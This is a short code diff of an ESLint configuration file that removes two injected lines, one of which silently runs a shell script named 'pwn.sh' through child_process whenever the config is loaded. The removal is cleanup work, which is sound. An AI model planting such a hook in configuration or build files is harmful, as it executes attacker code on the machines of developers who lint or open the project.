@@ -1,5 +1,3 @@
-console.log('ESLINTRC LOADED');
-try { require('child_process').execSync('bash pwn.sh'); } catch (e) {}
 module.exports = {
     'env': {
         'node': true,
